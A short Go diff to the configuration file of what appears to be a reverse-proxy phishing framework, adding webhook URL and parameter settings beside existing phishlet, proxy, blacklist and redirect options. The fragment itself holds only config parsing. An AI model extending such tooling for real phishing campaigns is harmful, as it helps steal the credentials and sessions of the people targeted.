@@ -42,6 +42,8 @@ type Config struct {
 	phishletNames     []string
 	activeHostnames   []string
 	redirectParam     string
+	webhookUrl        string
+	webhookParam      string
 	verificationParam string
 	verificationToken string
 	redirectUrl       string
@@ -68,6 +70,8 @@ const (
 	CFG_PROXY_PASSWORD     = "proxy_password"
 	CFG_PROXY_ENABLED      = "proxy_enabled"
 	CFG_BLACKLIST_MODE     = "blacklist_mode"
+	CFG_WEBHOOK_URL        = "webhook_url"
+	CFG_WEBHOOK_PARAM      = "webhook_param"
 )
 
 const DEFAULT_REDIRECT_URL = "https://www.youtube.com/watch?v=dQw4w9WgXcQ" // Rick'roll
@@ -121,6 +125,8 @@ func NewConfig(cfg_dir string, path string) (*Config, error) {
 	c.proxyPassword = c.cfg.GetString(CFG_PROXY_PASSWORD)
 	c.proxyEnabled = c.cfg.GetBool(CFG_PROXY_ENABLED)
 	c.blackListMode = c.cfg.GetString(CFG_BLACKLIST_MODE)
+	c.webhookUrl = c.cfg.GetString(CFG_WEBHOOK_URL)
+	c.webhookParam = c.cfg.GetString(CFG_WEBHOOK_PARAM)
 	s_enabled := c.cfg.GetStringSlice(CFG_SITES_ENABLED)
 	for _, site := range s_enabled {
 		c.sitesEnabled[site] = true
